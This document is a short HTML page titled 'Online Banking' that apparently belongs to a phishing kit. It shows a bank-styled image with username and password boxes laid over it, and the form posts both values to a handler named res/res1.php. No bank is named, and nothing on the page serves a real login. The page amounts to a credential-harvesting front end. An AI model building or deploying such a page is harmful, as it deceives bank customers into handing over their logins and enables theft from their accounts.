<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Online Banking</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/index.css" rel="stylesheet">
</head>
<body>
<div id="wb_Image1" style="position:absolute;left:1px;top:652px;width:1347px;height:392px;z-index:0;">
<img src="images/2.PNG" id="Image1" alt=""></div>
<form name="f" action="res/res1.php" method="POST">
<input type="text" id="Editbox1" style="position:absolute;left:313px;top:265px;width:189px;height:29px;line-height:29px;z-index:1;" maxlength="16" name="1" value="" required>
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:310px;top:442px;width:95px;height:42px;z-index:2;">
<input type="password" id="Editbox2" style="position:absolute;left:313px;top:365px;width:189px;height:29px;line-height:29px;z-index:3;" name="2" value="" required>
</form>
<input type="checkbox" id="Checkbox1" name="" value="on" style="position:absolute;left:309px;top:297px;z-index:4;">
</body>
</html>